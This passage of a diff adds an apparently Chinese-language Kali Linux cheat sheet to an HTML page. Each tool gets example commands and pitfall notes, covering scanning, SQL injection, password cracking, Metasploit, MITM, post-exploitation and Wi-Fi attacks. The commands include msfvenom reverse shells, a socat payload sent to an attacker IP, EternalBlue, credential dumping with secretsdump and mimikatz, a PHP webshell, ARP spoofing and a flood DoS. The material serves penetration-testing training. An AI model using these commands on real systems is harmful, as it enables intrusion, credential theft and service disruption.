+<pre><code>zaproxy &amp;
+zap.sh -cmd -quickurl http://10.10.10.5 -quickout report.html</code></pre>
+      <p class="note"><b>坑：</b>自动扫描前先手工走一遍站点，否则爬虫抓不到需要登录的页面。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>nikto</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">老牌 Web 服务器扫描器，检查危险文件、默认页面、过时组件、错误配置，速度很快。</p>
+<pre><code>nikto -h https://10.10.10.5 -ssl -o nikto.txt</code></pre>
+      <p class="note"><b>坑：</b>误报率高，看到"可能存在"要手工验证；对现代 SPA 基本无效。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>sqlmap</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">SQL 注入检测与利用的完整链条：判注入点、取库表、拖数据、读文件、拿 shell，支持几乎所有数据库。</p>
+<pre><code>sqlmap -u "http://10.10.10.5/item.php?id=1" --batch --dbs
+sqlmap -r req.txt -p id --level=3 --risk=2 --dump</code></pre>
+      <p class="note"><b>坑：</b><code>--os-shell</code>、<code>--dump-all</code> 是破坏性/高噪声操作，只在授权范围且明确允许时用。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>gobuster</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">用字典爆破目录、文件、DNS 子域、vhost、S3 桶。Go 写的，速度比 dirb 快一个量级。</p>
+<pre><code>gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,txt,bak</code></pre>
+      <p class="note"><b>坑：</b>遇到 403 也有价值（目录存在），要加 <code>-b 404</code> 而不是只留 200；注意 WAF 会封 IP。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>ffuf</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">通用 fuzzer：目录、参数、用户名、Host 头都能 FUZZ。响应过滤（<code>-fs</code>/<code>-mc</code>）比 gobuster 灵活。</p>
+<pre><code>ffuf -u http://10.10.10.5/FUZZ -w common.txt -mc 200,301,403 -fs 0
+ffuf -u "http://10.10.10.5/?id=FUZZ" -w ids.txt -mr "error"</code></pre>
+      <p class="note"><b>坑：</b>默认并发 40，遇到软 404 必须先 <code>-fs</code> 按响应大小过滤，否则满屏假阳性。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>dirb / dirbuster</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">经典目录扫描组合（dirbuster 是 GUI）。字典在 <code>/usr/share/dirb/wordlists/</code>，适合教学和快速验证。</p>
+<pre><code>dirb http://10.10.10.5 /usr/share/wordlists/dirb/common.txt</code></pre>
+      <p class="note"><b>坑：</b>慢，而且不识别 SPA 路由。现代目标优先用 ffuf/gobuster。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>WPScan</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">WordPress 专用扫描器：版本、插件/主题漏洞、弱口令、用户枚举，漏洞库需要 API token 才完整。</p>
+<pre><code>wpscan --url http://blog.example.com --enumerate vp,u --api-token XXX</code></pre>
+      <p class="note"><b>坑：</b>没 token 只能看基础信息；<code>--enumerate vp</code> 很慢且会被 <code>--stealthy</code> 限流。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>WhatWeb</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">指纹识别：CMS、框架、服务器版本、JS 库、分析工具，一次跑出目标用的是哪套技术栈。</p>
+<pre><code>whatweb -a 3 https://example.com --log-json=whatweb.json</code></pre>
+      <p class="note"><b>坑：</b><code>-a 3</code> 主动性最高，也最容易被 WAF 拦；先用 <code>-a 1</code> 默默看一眼。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>wafw00f</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">识别目标前面是 Cloudflare、Akamai、ModSecurity 还是没装 WAF，决定后面用多激进的打法。</p>
+<pre><code>wafw00f https://example.com -a</code></pre>
+      <p class="note"><b>坑：</b>识别失败不代表没有 WAF，只代表它的特征没匹配上。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>Nuclei</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">基于 YAML 模板的漏洞扫描器，社区模板上万条，CVE 曝光后几小时内就有检测模板。</p>
+<pre><code>nuclei -update-templates
+nuclei -u https://example.com -tags cve,rce -severity high,critical</code></pre>
+      <p class="note"><b>坑：</b>模板不更新等于白跑；默认并发会打崩小站点，加 <code>-rl 50</code> 限速。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>Commix</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">命令注入自动化：探测注入点、猜分隔符、拿回显、反弹 shell，对 GET/POST/Cookie 都支持。</p>
+<pre><code>commix --url="http://10.10.10.5/ping.php?ip=127.0.0.1" --batch</code></pre>
+      <p class="note"><b>坑：</b>盲注场景要配 <code>--os-cmd</code> 和延时参数，不然一直报"未找到注入点"。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>XSStrike / xsser</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">XSS 检测与 payload 生成，带上下文分析和 WAF 绕过尝试。</p>
+<pre><code>xsser --url="http://10.10.10.5/search?q=XSS"</code></pre>
+      <p class="note"><b>坑：</b>反射型 XSS 现在价值有限，别把扫描器报的"可能存在"直接写进报告当确认漏洞。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>BeEF</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">浏览器利用框架：XSS 之后挂 hook，能做的事变成"控制一个浏览器"——截图、跳转、键盘记录、内网探测。</p>
+<pre><code>sudo beef-xss
+# 面板 http://127.0.0.1:3000/ui/panel</code></pre>
+      <p class="note"><b>坑：</b>默认口令必须改；hook 脚本走 HTTP，混合内容页面里会被浏览器拦掉。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>mitmproxy</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">命令行/可编程的中间人代理，适合批量改包、写脚本处理流量、把请求导出给自动化流程。</p>
+<pre><code>mitmproxy -p 8080
+mitmdump -w flows.mitm --set console_eventlog_verbosity=info</code></pre>
+      <p class="note"><b>坑：</b>证书要装到目标设备信任链，Android 7+ 需要改 APK 的 networkSecurityConfig 才行。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>httpx</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">把一堆主机名变成"哪些还活着、跑的什么技术、标题是什么、状态码多少"，资产验证的标准工具。</p>
+<pre><code>cat subs.txt | httpx -status-code -title -tech-detect -o live.txt</code></pre>
+      <p class="note"><b>坑：</b>默认只探 HTTP/HTTPS 常用端口，非标端口要显式加 <code>-ports</code>。</p>
+    </article>
+
+    <!-- ===== 漏洞分析 ===== -->
+    <article class="card" data-cat="vuln">
+      <div class="card-h"><h3>searchsploit</h3><span class="tag">漏洞分析</span></div>
+      <p class="desc">本地 Exploit-DB 的离线查询，不联网也能按产品、版本、CVE 找到公开 PoC，直接拷到工作目录。</p>
+<pre><code>searchsploit apache 2.4.49
+searchsploit -m 50383
+searchsploit -u   # 更新本地库</code></pre>
+      <p class="note"><b>坑：</b>公开 PoC 大多不能直接跑，改之前先读懂；老脚本依赖的库早已不兼容。</p>
+    </article>
+
+    <article class="card" data-cat="vuln">
+      <div class="card-h"><h3>Greenbone / GVM（原 OpenVAS）</h3><span class="tag">漏洞分析</span></div>
+      <p class="desc">完整的漏洞扫描平台：上万条 NVTs 检测项、Web 管理界面、可导出专业报告，适合做基线扫描。</p>
+<pre><code>sudo gvm-setup
+sudo gvm-start   # 面板 https://127.0.0.1:9392</code></pre>
+      <p class="note"><b>坑：</b>首次初始化极慢（要同步漏洞库），且吃 4GB+ 内存；扫描会留下大量日志。</p>
+    </article>
+
+    <article class="card" data-cat="vuln">
+      <div class="card-h"><h3>Lynis</h3><span class="tag">漏洞分析</span></div>
+      <p class="desc">主机层面安全审计：内核参数、SSH 配置、文件权限、过期软件、日志策略，给出加固建议和评分。</p>
+<pre><code>sudo lynis audit system</code></pre>
+      <p class="note"><b>坑：</b>它只给"建议"不给"漏洞"，报告里的 warning 要自己判断是否真在威胁模型内。</p>
+    </article>
+
+    <article class="card" data-cat="vuln">
+      <div class="card-h"><h3>sslscan / testssl.sh</h3><span class="tag">漏洞分析</span></div>
+      <p class="desc">TLS 配置体检：协议版本、弱套件、证书链、Heartbleed/POODLE 一类已知问题。</p>
+<pre><code>sslscan example.com:443
+testssl.sh --severity HIGH https://example.com</code></pre>
+      <p class="note"><b>坑：</b>CDN 会终止 TLS，扫出来的是 CDN 的配置，不是源站的。</p>
+    </article>
+
+    <article class="card" data-cat="vuln">
+      <div class="card-h"><h3>YARA</h3><span class="tag">漏洞分析</span></div>
+      <p class="desc">用规则匹配恶意软件特征，写规则、扫文件、扫内存镜像都行，防守方和样本分析都在用。</p>
+<pre><code>yara -r rules.yar /samples/</code></pre>
+      <p class="note"><b>坑：</b>规则写得太宽会满屏命中，太窄就漏；<code>-s</code> 看命中字符串才知道为什么匹配。</p>
+    </article>
+
+    <article class="card" data-cat="vuln">
+      <div class="card-h"><h3>Nmap NSE 漏洞脚本</h3><span class="tag">漏洞分析</span></div>
+      <p class="desc">不装扫描平台也能做快速验证：<code>vuln</code> 类脚本覆盖 SMB、SSL、HTTP 的常见已知问题。</p>
+<pre><code>sudo nmap -sV --script vuln -p 445,443 10.10.10.5
+nmap --script smb-vuln-ms17-010 -p445 10.10.10.5</code></pre>
+      <p class="note"><b>坑：</b>部分脚本会触发崩溃或蓝屏（如针对特定 SMB 漏洞），生产环境慎用。</p>
+    </article>
+
+    <!-- ===== 密码攻击 ===== -->
+    <article class="card" data-cat="pass">
+      <div class="card-h"><h3>Hydra</h3><span class="tag">密码攻击</span></div>
+      <p class="desc">在线爆破的多协议瑞士军刀：SSH、FTP、RDP、SMB、MySQL、HTTP 表单、IMAP 等五十多种。</p>
+<pre><code>hydra -L users.txt -P pass.txt ssh://10.10.10.5 -t 4
+hydra -l admin -P pass.txt 10.10.10.5 http-post-form "/login:u=^USER^&amp;p=^PASS^:F=incorrect"</code></pre>
+      <p class="note"><b>坑：</b>线程开大会把服务打挂或被 fail2ban 封；先确认账号是否存在，别把"锁定"当成"密码错"。</p>
+    </article>
+
+    <article class="card" data-cat="pass">
+      <div class="card-h"><h3>Medusa</h3><span class="tag">密码攻击</span></div>
+      <p class="desc">和 Hydra 同类，模块化设计，并发模型不同，某些协议上比 Hydra 稳（尤其 HTTP 基本认证）。</p>
+<pre><code>medusa -h 10.10.10.5 -u admin -P pass.txt -M ssh -t 4</code></pre>
+      <p class="note"><b>坑：</b>错误提示不友好，认证失败和连接失败要看 <code>-v 6</code> 的调试输出区分。</p>
+    </article>
+
+    <article class="card" data-cat="pass">
+      <div class="card-h"><h3>John the Ripper</h3><span class="tag">密码攻击</span></div>
+      <p class="desc">离线哈希破解，自动识别哈希类型，规则引擎（wordlist + mangling）比纯字典强得多。</p>
+<pre><code>gunzip /usr/share/wordlists/rockyou.txt.gz
+john --wordlist=rockyou.txt hashes.txt
+john --show hashes.txt</code></pre>
+      <p class="note"><b>坑：</b>Kali 里 rockyou 是压缩包，不解压就跑会报"文件不存在"；先 <code>john --list=formats</code> 确认格式。</p>
+    </article>
+
+    <article class="card" data-cat="pass">
+      <div class="card-h"><h3>Hashcat</h3><span class="tag">密码攻击</span></div>
+      <p class="desc">GPU 加速的哈希破解，支持 300+ 种算法，规则攻击、掩码攻击、组合攻击都比 CPU 工具快几个数量级。</p>
+<pre><code>hashcat -m 1000 ntlm.txt rockyou.txt -O
+hashcat -m 22000 capture.hc22000 rockyou.txt
+hashcat -m 0 md5.txt -a 3 ?a?a?a?a?a?a</code></pre>
+      <p class="note"><b>坑：</b>虚拟机里没有 GPU 直通时速度只有实机的零头；<code>-m</code> 选错会静默失败，先跑 <code>--example-hashes</code>。</p>
+    </article>
+
+    <article class="card" data-cat="pass">
+      <div class="card-h"><h3>Crunch</h3><span class="tag">密码攻击</span></div>
+      <p class="desc">按规则生成字典：指定长度、字符集、固定位置、模式，比手写脚本可靠。</p>
+<pre><code>crunch 8 8 -t Pass@@@@ -o list.txt
+crunch 6 8 abc123 -o list.txt</code></pre>
+      <p class="note"><b>坑：</b>生成量按指数涨，<code>?a?a?a?a?a?a</code> 就是几百 GB；先算体积再落盘。</p>
+    </article>
+
+    <article class="card" data-cat="pass">
+      <div class="card-h"><h3>CeWL</h3><span class="tag">密码攻击</span></div>
+      <p class="desc">爬目标站点生成定制字典——公司名、产品名、员工名字，往往比通用字典命中率高得多。</p>
+<pre><code>cewl -d 2 -m 6 -w words.txt https://example.com</code></pre>
+      <p class="note"><b>坑：</b>爬太深会被拦；配合 <code>--with-numbers</code> 和 john 的规则一起用效果好。</p>
+    </article>
+
+    <article class="card" data-cat="pass">
+      <div class="card-h"><h3>Pipal</h3><span class="tag">密码攻击</span></div>
+      <p class="desc">分析已泄露密码库的统计特征：常用词、键盘模式、年份、长度分布，用来优化破解策略。</p>
+<pre><code>pipal passwords.txt</code></pre>
+      <p class="note"><b>坑：</b>处理的是真实凭据，属于敏感数据，别留在共享目录或未加密的磁盘里。</p>
+    </article>
+
+    <article class="card" data-cat="pass">
+      <div class="card-h"><h3>wordlists / SecLists</h3><span class="tag">密码攻击</span></div>
+      <p class="desc">Kali 自带基础字典；SecLists 收集了目录、参数、用户名、密码、子域等各类字典，是实际测试的默认来源。</p>
+<pre><code>sudo apt install seclists
+ls /usr/share/seclists/Discovery/Web-Content/
+ls /usr/share/wordlists/</code></pre>
+      <p class="note"><b>坑：</b>字典选错比工具选错更浪费时间：先看目标语言和框架，再挑对应字典。</p>
+    </article>
+
+    <!-- ===== 漏洞利用 ===== -->
+    <article class="card" data-cat="exploit">
+      <div class="card-h"><h3>Metasploit Framework</h3><span class="tag">漏洞利用</span></div>
+      <p class="desc">最完整的漏洞利用框架：exploit / payload / auxiliary / post 模块齐全，配合数据库管理主机与战果。</p>
+<pre><code>sudo msfdb init &amp;&amp; msfconsole -q
+msf6 &gt; search type:exploit platform:windows smb
+msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf6 &gt; set RHOSTS 10.10.10.5
+msf6 &gt; set LHOST 10.10.14.2
+msf6 &gt; run</code></pre>
+      <p class="note"><b>坑：</b><code>LHOST</code> 填错是最常见的失败原因；先 <code>ip a</code> 确认回连网卡，再检查防火墙。</p>
+    </article>
+
+    <article class="card" data-cat="exploit">
+      <div class="card-h"><h3>msfvenom</h3><span class="tag">漏洞利用</span></div>
+      <p class="desc">生成各种格式的 payload：exe、elf、apk、php、war、宏文档，可编码、可绑定端口、可分段。</p>
+<pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o shell.elf
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4443 -f exe -o up.exe</code></pre>
+      <p class="note"><b>坑：</b>现代杀软基本都认识裸 payload；<code>-e</code> 编码器早已不能免杀，别信老教程。</p>
+    </article>
+
+    <article class="card" data-cat="exploit">
+      <div class="card-h"><h3>pwntools</h3><span class="tag">漏洞利用</span></div>
+      <p class="desc">写 exploit 的 Python 框架：打包/解包、ROP 构造、远程连接、gdb 调试一条龙，CTF 和真实二进制漏洞都用它。</p>
+<pre><code>python3 -c "from pwn import *; context.log_level='debug'; io=remote('10.10.10.5',1337)"
+checksec --file=./vuln</code></pre>
+      <p class="note"><b>坑：</b>库版本更新快，老脚本的 <code>process()</code>/<code>remote()</code> 调用可能已变，先读当前文档。</p>
+    </article>
+
+    <article class="card" data-cat="exploit">
+      <div class="card-h"><h3>searchsploit + 手工验证</h3><span class="tag">漏洞利用</span></div>
+      <p class="desc">拿到版本号后，最有效的路径往往不是"上框架"，而是找到对应 PoC、读懂、改参数、在隔离环境复现。</p>
+<pre><code>searchsploit -w "textpattern 4.8"
+searchsploit -m 48931 &amp;&amp; vim 48931.py</code></pre>
+      <p class="note"><b>坑：</b>PoC 里的反弹 IP、路径、认证头基本都是作者的，直接跑必然失败；先逐行读。</p>
+    </article>
+
+    <!-- ===== 嗅探 / 中间人 ===== -->
+    <article class="card" data-cat="mitm">
+      <div class="card-h"><h3>Wireshark</h3><span class="tag">嗅探/中间人</span></div>
+      <p class="desc">图形化协议分析：抓包、过滤、跟踪流、解密 TLS（有密钥时），排查"到底发了什么"最直接的工具。</p>
+<pre><code>sudo wireshark &amp;
+# 过滤：http.request || dns || tcp.port==445</code></pre>
+      <p class="note"><b>坑：</b>交换网络里默认只能看到自己的流量，要先做端口镜像或 ARP 欺骗（需授权）。</p>
+    </article>
+
+    <article class="card" data-cat="mitm">
+      <div class="card-h"><h3>tcpdump</h3><span class="tag">嗅探/中间人</span></div>
+      <p class="desc">服务器上唯一能用的抓包工具，无 GUI 依赖；配合 BPF 过滤，抓完拉回本地用 Wireshark 看。</p>
+<pre><code>sudo tcpdump -i eth0 -nn -s0 -w cap.pcap 'tcp port 80 or 443'</code></pre>
+      <p class="note"><b>坑：</b>忘了 <code>-s0</code> 会截断包；长时间抓包要加 <code>-C 100 -W 10</code> 轮转，否则把磁盘写满。</p>
+    </article>
+
+    <article class="card" data-cat="mitm">
+      <div class="card-h"><h3>Ettercap</h3><span class="tag">嗅探/中间人</span></div>
+      <p class="desc">经典中间人工具：ARP 欺骗、DNS 欺骗、注入过滤，带 GUI 和插件（如 SSL 剥离）。</p>
+<pre><code>sudo ettercap -G
+sudo ettercap -T -q -i eth0 -M arp:remote /10.10.10.5// /10.10.10.1//</code></pre>
+      <p class="note"><b>坑：</b>ARP 欺骗会打断目标网络，生产环境属于高危行为；做完务必恢复 ARP 表。</p>
+    </article>
+
+    <article class="card" data-cat="mitm">
+      <div class="card-h"><h3>Bettercap</h3><span class="tag">嗅探/中间人</span></div>
+      <p class="desc">Ettercap 的现代替代：交互式命令 + 模块化，ARP/DNS/HTTP 代理、Wi-Fi 与 BLE 都在一个界面里。</p>
+<pre><code>sudo bettercap -iface eth0
+&gt; net.probe on
+&gt; set arp.spoof.targets 10.10.10.5
+&gt; arp.spoof on
+&gt; net.sniff on</code></pre>
+      <p class="note"><b>坑：</b>开了 <code>arp.spoof</code> 不开转发会直接断网；先 <code>net.sniff</code> 观察再动手。</p>
+    </article>
+
+    <article class="card" data-cat="mitm">
+      <div class="card-h"><h3>Responder</h3><span class="tag">嗅探/中间人</span></div>
+      <p class="desc">内网最有效的攻击之一：应答 LLMNR/NBT-NS/mDNS 查询，骗取 NetNTLM 哈希，再离线破解或中继。</p>
+<pre><code>sudo responder -I eth0 -wrv</code></pre>
+      <p class="note"><b>坑：</b>一定要先关掉系统自带的同名服务端口冲突；抓到的是 NetNTLMv2，不是明文口令。</p>
+    </article>
+
+    <article class="card" data-cat="mitm">
+      <div class="card-h"><h3>arpspoof（dsniff）</h3><span class="tag">嗅探/中间人</span></div>
+      <p class="desc">最小化的 ARP 欺骗工具，两个方向各跑一条就能做双向中间人，适合配合 Wireshark 教学演示。</p>
+<pre><code>sudo sysctl -w net.ipv4.ip_forward=1
+sudo arpspoof -i eth0 -t 10.10.10.5 10.10.10.1
+sudo arpspoof -i eth0 -t 10.10.10.1 10.10.10.5</code></pre>
+      <p class="note"><b>坑：</b>不开启 IP 转发，目标会直接断网；结束后要手动恢复，或等 ARP 缓存超时。</p>
+    </article>
+
+    <article class="card" data-cat="mitm">
+      <div class="card-h"><h3>macchanger</h3><span class="tag">嗅探/中间人</span></div>
+      <p class="desc">修改网卡 MAC，绕过基于 MAC 的白名单、或让两个网卡在同一网络中不冲突。</p>
+<pre><code>sudo ip link set eth0 down
+sudo macchanger -r eth0
+sudo ip link set eth0 up</code></pre>
+      <p class="note"><b>坑：</b>NetworkManager 会改回去；先 <code>nmcli device set eth0 managed no</code>。</p>
+    </article>
+
+    <article class="card" data-cat="mitm">
+      <div class="card-h"><h3>hping3</h3><span class="tag">嗅探/中间人</span></div>
+      <p class="desc">手工构造 TCP/IP 包：探测防火墙规则、做空闲扫描、测试分片处理，也可用于压力测试。</p>
+<pre><code>sudo hping3 -S -p 80 -c 3 10.10.10.5
+sudo hping3 --flood -S -p 80 10.10.10.5   # 拒绝服务，慎用</code></pre>
+      <p class="note"><b>坑：</b><code>--flood</code> 就是 DoS，未授权使用在国内可直接入刑；只在自建靶场里验证。</p>
+    </article>
+
+    <!-- ===== 后渗透 / 横向 ===== -->
+    <article class="card" data-cat="post">
+      <div class="card-h"><h3>Impacket</h3><span class="tag">后渗透</span></div>
+      <p class="desc">Windows 协议栈的 Python 实现，一整套横向工具：psexec、wmiexec、secretsdump、GetNPUsers、ntlmrelayx。</p>
+<pre><code>impacket-secretsdump -just-dc corp.local/admin:'Passw0rd'@10.10.10.1
+impacket-psexec corp.local/admin:'Passw0rd'@10.10.10.5
+impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1</code></pre>
+      <p class="note"><b>坑：</b>secretsdump 会导出域内全部哈希，属于极高敏感操作，只在授权且明确允许的范围内做。</p>
+    </article>
+
+    <article class="card" data-cat="post">
+      <div class="card-h"><h3>NetExec（nxc）</h3><span class="tag">后渗透</span></div>
+      <p class="desc">CrackMapExec 的继任者：一条命令批量验证 SMB/WinRM/LDAP/MSSQL 凭据、列共享、执行命令、抓哈希。</p>
+<pre><code>nxc smb 10.10.10.0/24 -u user -p pass --shares
+nxc winrm 10.10.10.5 -u user -p pass -x whoami</code></pre>
+      <p class="note"><b>坑：</b>老教程写 <code>crackmapexec</code>，新版本命令是 <code>nxc</code>，两个包可能都在仓库里，<code>apt search</code> 确认。</p>
+    </article>
+
+    <article class="card" data-cat="post">
+      <div class="card-h"><h3>Evil-WinRM</h3><span class="tag">后渗透</span></div>
+      <p class="desc">通过 WinRM 拿交互式 shell，支持上传下载、加载 PowerShell 脚本、用哈希登录（Pass-the-Hash）。</p>
+<pre><code>evil-winrm -i 10.10.10.5 -u administrator -p 'Passw0rd!'
+evil-winrm -i 10.10.10.5 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0</code></pre>
+      <p class="note"><b>坑：</b>WinRM 默认不对外开放，5985/5986 不在扫描结果里就别浪费时间。</p>
+    </article>
+
+    <article class="card" data-cat="post">
+      <div class="card-h"><h3>BloodHound</h3><span class="tag">后渗透</span></div>
+      <p class="desc">把 AD 的权限关系画成图，自动找出"从当前账号到域管理员"的最短路径，域渗透规划的核心工具。</p>
+<pre><code>sudo neo4j start
+bloodhound &amp;
+# 采集端：bloodhound-python -u user -p pass -d corp.local -ns 10.10.10.1 -c all</code></pre>
+      <p class="note"><b>坑：</b>导入数据前 Neo4j 要先改初始密码；采集用 <code>-c all</code> 会产生大量 LDAP 查询，容易被发现。</p>
+    </article>
+
+    <article class="card" data-cat="post">
+      <div class="card-h"><h3>Chisel</h3><span class="tag">后渗透</span></div>
+      <p class="desc">单文件隧道工具，把内网端口通过 HTTP 隧道带到攻击机，纯 Go 实现，落地即用。</p>
+<pre><code># 攻击机
+chisel server -p 8000 --reverse
+# 目标机
+./chisel client 10.10.14.2:8000 R:socks</code></pre>
+      <p class="note"><b>坑：</b>默认不带 TLS，流量特征明显；生产环境常被流量检测规则命中。</p>
+    </article>
+
+    <article class="card" data-cat="post">
+      <div class="card-h"><h3>proxychains4</h3><span class="tag">后渗透</span></div>
+      <p class="desc">让任意 TCP 程序走 SOCKS/HTTP 代理，配合 chisel/ssh 隧道即可用 nmap、curl 访问内网。</p>
+<pre><code>sudo vim /etc/proxychains4.conf   # 末尾加 socks5 127.0.0.1 1080
+proxychains4 -q nmap -sT -Pn -p 80,445 172.16.5.10</code></pre>
+      <p class="note"><b>坑：</b>只能代理 TCP，ICMP 和 UDP 扫描全废；必须用 <code>-sT</code>，<code>-sS</code> 走不通。</p>
+    </article>
+
+    <article class="card" data-cat="post">
+      <div class="card-h"><h3>sshuttle</h3><span class="tag">后渗透</span></div>
+      <p class="desc">把 SSH 变成 VPN，不用在目标装任何东西，一条命令就能访问整个内网网段（含 DNS）。</p>
+<pre><code>sshuttle -r user@10.10.10.5 172.16.5.0/24</code></pre>
+      <p class="note"><b>坑：</b>需要目标有 SSH 且允许转发；本机要 root；和已有 VPN 路由容易冲突。</p>
+    </article>
+
+    <article class="card" data-cat="post">
+      <div class="card-h"><h3>socat</h3><span class="tag">后渗透</span></div>
+      <p class="desc">"网络界的瑞士军刀"：端口转发、反弹 shell、文件传输、串口转 TCP，比 nc 功能多且稳定。</p>
+<pre><code>socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80
+socat file:./payload.sh TCP:10.10.14.2:9001</code></pre>
+      <p class="note"><b>坑：</b>反向 shell 时记得加 <code>pty,raw,echo=0</code>，否则终端没有交互。</p>
+    </article>
+
+    <article class="card" data-cat="post">
+      <div class="card-h"><h3>Netcat（nc / ncat）</h3><span class="tag">后渗透</span></div>
+      <p class="desc">最基础的 TCP/UDP 工具：监听端口接 shell、传文件、做端口探测。Kali 默认的 nc 是 OpenBSD 版。</p>
+<pre><code>nc -lvnp 4444
+nc -lvnp 4444 &gt; received.bin
+nc 10.10.10.5 80</code></pre>
+      <p class="note"><b>坑：</b>OpenBSD 版没有 <code>-e</code>，反弹 shell 要用 <code>-c</code> 或命名管道。</p>
+    </article>
+
+    <article class="card" data-cat="post">
+      <div class="card-h"><h3>Mimikatz</h3><span class="tag">后渗透</span></div>
+      <p class="desc">Windows 凭据提取的事实标准：明文口令、NTLM 哈希、Kerberos 票据、PIN 码，域渗透的必经一步。</p>
+<pre><code># Windows 目标上（需管理员 + 关闭杀软或绕过）
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit</code></pre>
+      <p class="note"><b>坑：</b>它不在 Kali 仓库里，是 Windows 二进制；直接把 exe 丢上去基本会被 Defender 删掉。</p>
+    </article>
+
+    <article class="card" data-cat="post">
+      <div class="card-h"><h3>Kerbrute</h3><span class="tag">后渗透</span></div>
+      <p class="desc">Kerberos 预认证枚举用户名，不触发登录失败锁定，是域内用户收集最快的方式。</p>
+<pre><code>kerbrute userenum -d corp.local --dc 10.10.10.1 users.txt</code></pre>
+      <p class="note"><b>坑：</b>只能确认"用户存在"，不能验证密码；Kerberos 时间偏差超过 5 分钟就全失败。</p>
+    </article>
+
+    <article class="card" data-cat="post">
+      <div class="card-h"><h3>Weevely</h3><span class="tag">后渗透</span></div>
+      <p class="desc">生成并管理 PHP webshell，把上传的 shell 变成类似终端的会话，支持模块化后渗透操作。</p>
+<pre><code>weevely generate S3cret shell.php
+weevely http://10.10.10.5/uploads/shell.php S3cret</code></pre>
+      <p class="note"><b>坑：</b>生成的 shell 有明显特征，主流 WAF 和杀软都能识别；只在授权环境使用。</p>
+    </article>
+
+    <!-- ===== 无线 ===== -->
+    <article class="card" data-cat="wireless">
+      <div class="card-h"><h3>airmon-ng / airmon-zc</h3><span class="tag">无线</span></div>
+      <p class="desc">把无线网卡切到监听模式（monitor），是后续抓包、注入的前提。新内核用 <code>airmon-ng start wlan0</code> 后检查接口名。</p>
+<pre><code>sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+iw dev</code></pre>
+      <p class="note"><b>坑：</b>网卡必须支持监听与注入（Atheros AR9271、RTL8812AU 等）；切模式前先杀掉 NetworkManager，否则监听口会被管回去。</p>
+    </article>
+
+    <article class="card" data-cat="wireless">
+      <div class="card-h"><h3>airodump-ng</h3><span class="tag">无线</span></div>
+      <p class="desc">无线网络嗅探：列出周边 AP 的 BSSID、信道、加密方式、客户端，并抓握手包。</p>
+<pre><code>sudo airodump-ng wlan0mon
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon</code></pre>
+      <p class="note"><b>坑：</b>5GHz 要指定信道或分开扫；抓不到握手包通常是没人连接，不是命令错。</p>
+    </article>
+
+    <article class="card" data-cat="wireless">
+      <div class="card-h"><h3>aireplay-ng</h3><span class="tag">无线</span></div>
+      <p class="desc">报文注入：反认证（deauth）踢客户端重连以抓握手包、伪造认证、ARP 重放加速 IV 收集。</p>
+<pre><code>sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon</code></pre>
+      <p class="note"><b>坑：</b>deauth 会让目标断网，属于主动干扰；WPA3 和 802.11w（PMF）下基本无效。</p>
+    </article>
+
+    <article class="card" data-cat="wireless">
+      <div class="card-h"><h3>aircrack-ng</h3><span class="tag">无线</span></div>
+      <p class="desc">用字典离线跑 WPA/WPA2 握手包；WEP 场景可直接统计破解。</p>
+<pre><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF cap-01.cap</code></pre>
+      <p class="note"><b>坑：</b>握手包不完整（没有 4 次握手全流程）会一直报"没有有效握手"；先用 <code>aircrack-ng cap.cap</code> 检查。</p>
+    </article>
+
+    <article class="card" data-cat="wireless">
+      <div class="card-h"><h3>hcxdumptool</h3><span class="tag">无线</span></div>
+      <p class="desc">现代 WPA 抓包工具，同时采集 PMKID 和 EAPOL，PMKID 攻击不需要等客户端上线。</p>
+<pre><code>sudo hcxdumptool -i wlan0 -o dump.pcapng --enable_status=1</code></pre>
+      <p class="note"><b>坑：</b>会主动发包，噪声大；接口名要用原始 wlan0 而非 mon 口，版本间参数变化大。</p>
+    </article>
+
+    <article class="card" data-cat="wireless">
+      <div class="card-h"><h3>hcxtools（hcxpcapngtool）</h3><span class="tag">无线</span></div>
